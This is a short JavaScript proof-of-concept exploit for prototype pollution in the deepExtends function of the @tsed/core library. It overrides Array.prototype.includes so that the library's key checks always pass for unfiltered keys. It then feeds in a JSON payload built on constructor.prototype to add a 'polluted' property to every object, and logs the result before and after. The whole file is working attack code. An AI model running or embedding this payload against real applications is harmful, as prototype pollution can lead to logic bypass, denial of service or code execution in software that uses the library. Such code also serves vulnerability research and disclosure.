Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const {deepExtends} = require('@tsed/core');
const payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
let obj = {};
console.log({}.polluted);
let result = deepExtends({ security: [{ 1: 'o' }] }, payload);
console.log({}.polluted);